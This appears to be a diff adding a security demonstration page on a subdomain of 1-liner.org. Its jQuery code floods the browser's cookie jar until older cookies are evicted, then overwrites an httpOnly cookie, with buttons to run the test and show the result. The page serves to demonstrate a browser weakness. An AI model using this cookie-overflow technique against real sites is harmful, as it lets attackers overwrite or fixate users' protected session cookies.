@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+
+    <title>Other Subdomain</title>
+
+    <script src="../../js/jquery-1.7.2.min.js"></script>
+    <script src="../../js/jquery.cookie.js"></script>
+    <script>
+        var overflowCookieJar = function() {
+                    var name = "marker", val = "markerVal", counter = 0;
+                    $.cookie(name, val, {path: "/", domain: ".1-liner.org"});
+                    while($.cookie(name) == val) {
+                        $.cookie(name + counter++, val, {path: "/", domain: ".1-liner.org"});
+                    }
+                    return counter;
+                },
+                overwriteCookie = function(knownName, overwriteValue) {
+                    $.cookie(knownName, overwriteValue, {path: "/", domain: ".1-liner.org"});
+                },
+                isCookieOverwritten = function(knownName, overwriteValue) {
+                    return $.cookie(knownName) === overwriteValue;
+                },
+                outputHttpOnlyCookieOverwriteResult = function(knownName, overwriteValue) {
+                    $("#httpOnlyOutput").text("The httpOnly cookie was " + (isCookieOverwritten(knownName, overwriteValue)? "" : "not ") + "overwritten.");
+                };
+
+        $(document).ready(function() {
+            var overwriteValue = "overwritten", knownHttpOnlyName = "httpOnlyCookie";
+            $("#cookieJarOverflowButton").click(function(event) {
+                var count = -1;
+                $("#cookieJarOutput").text("Running ...");
+                count = overflowCookieJar();  // Timeout needed because cookie write loop freezes render thread
+                $("#cookieJarOutput").text("It took " + count + " cookies to overflow the jar. ");
+                overwriteCookie(knownHttpOnlyName, overwriteValue);
+                outputHttpOnlyCookieOverwriteResult(knownHttpOnlyName, overwriteValue);
+            });
+            $("#httpOnlyWipeButton").click(function(event) {
+                overwriteCookie(knownHttpOnlyName, overwriteValue);
+                outputHttpOnlyCookieOverwriteResult(knownHttpOnlyName, overwriteValue);
+            });
+        });
+    </script>
+
+</head>
+<body>
+<h3>other.1-liner.org</h3>
+<button id="httpOnlyWipeButton">Try overwriting httpOnly cookie directly</button><br>
+<button id="cookieJarOverflowButton">Start overflowing cookie jar</button><br>
+
+<div id="cookieJarOutput"></div>
+<div id="httpOnlyOutput"></div>
+
+</body>
+</html>
